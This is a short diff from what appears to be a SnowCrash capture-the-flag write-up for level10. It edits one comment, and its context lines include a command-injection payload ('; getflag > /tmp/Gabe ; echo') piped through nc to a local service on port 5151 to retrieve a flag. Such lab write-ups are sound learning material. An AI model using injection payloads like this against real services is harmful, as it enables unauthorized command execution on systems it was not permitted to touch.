@@ -27,7 +27,7 @@ level10@SnowCrash:~$ ./level10 token
 level10@SnowCrash:~$ cat token
 cat: token: Permission denied
 
-# Lets see if we can exploit it with echo and using nc with our localhost 5151  and give us the password too and 6969 only gives the flag
+# Lets see if we can exploit it with echo and using nc with our port 5151  and give us the password too and 6969 only gives the flag
 #	Note localhost 5151 is home in networking
 echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
 
